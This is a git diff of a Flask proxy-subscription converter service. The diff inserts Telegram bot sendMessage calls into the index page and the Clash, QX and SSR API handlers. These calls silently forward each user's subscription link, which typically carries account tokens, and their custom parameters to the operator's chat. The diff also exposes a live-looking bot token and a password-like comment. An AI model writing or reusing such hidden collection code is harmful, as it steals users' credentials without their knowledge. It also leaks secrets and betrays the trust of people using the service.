@@ -374,17 +374,17 @@ def get(name):
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == "POST":
-        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人打开了你的托管页面 : \n'))
         sub = request.form['left']
         custom = urllib.parse.quote(request.form['custom'])
-        Clash = 'http://185.238.248.145:10086/clash/'+str(sub).replace('/','!')
+        Clash = 'http://185.238.248.145:10086/clashr/nico?sublink='+str(sub)+'&selectfirst=no'
         if custom == '':
              CustomClash = '请填入想要的节点，假设想要香港就@香港，假设想要香港的2倍节点就@香港&2倍。支持多个@'
              CustomSSR =   '请填入想要的节点，同上'
         else:
-            CustomClash = 'http://185.238.248.145:10086/clash/'+str(sub).replace('/','!')+str(custom)
-            CustomSSR = 'http://185.238.248.145:10086/ssr/'+str(sub).replace('/','!')+str(custom).split('@@')[0]
-        QX = 'http://185.238.248.145:2333/'+str(sub).replace('/','!')+'@STC'
+            CustomClash = 'http://185.238.248.145:10086/clashr/nico?sublink='+str(sub)+'&custom='+str(custom)+'&selectfirst=no'
+            CustomSSR = 'http://185.238.248.145:10086/ssr/nico?sublink='+str(sub)+'&custom='+str(custom)
+        QX = 'http://185.238.248.145:10086/qx/nico?sublink='+str(sub)+'&tag=stc'
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人打开了你的托管页面 : \n')+sub+custom)
         return render_template('index.html', Clash = Clash,QX = QX,CustomClash = CustomClash,CustomSSR = CustomSSR,Custom =request.form['custom'] ,sub = sub)
     return render_template('index.html')
 
@@ -392,17 +392,18 @@ def index():
 def clashapi():
     try:
         sub = request.args.get('sublink')
-        print(sub)
+        #print(sub)
         try:
             arg = request.args.get('selectfirst')
         except Exception as e:
             arg = 'no'
-        print(arg)
+        #print(arg)
         try:
             custom = request.args.get('custom').replace('!','&')
         except Exception as e:
             custom = ''
-        print(custom)
+        #print(custom)
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+custom))
         if custom == '' :
             return writeRules(sub,arg)
         else :
@@ -411,17 +412,30 @@ def clashapi():
         return '检测调用格式是否正确'+ aff
 
 @app.route('/qx/nico', methods=['GET', 'POST'])
-def search():
+def qxapi():
     try:
         sub = request.args.get('sublink').replace('!','&')              
-        print(sub)
+        #print(sub)
         tag=request.args.get('tag')
-        print(tag)
+        #print(tag)
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+tag))
         return  getqxrules(sub,tag)
 
     except Exception as e:
         return '请调用格式适合正确'
 
+@app.route('/ssr/nico', methods=['GET', 'POST'])
+def ssrapi():
+    try:
+        sub = request.args.get('sublink').replace('!','&')              
+        #print(sub)
+        custom=request.args.get('custom')
+        #print(tag)
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+custom))
+        return  getcustomssrlink(sub,custom)
+
+    except Exception as e:
+        return '请调用格式适合正确'
 if __name__ == '__main__':
     # :  @R0zR*j#xri5
     app.run(host='0.0.0.0',debug=False,port=10086)
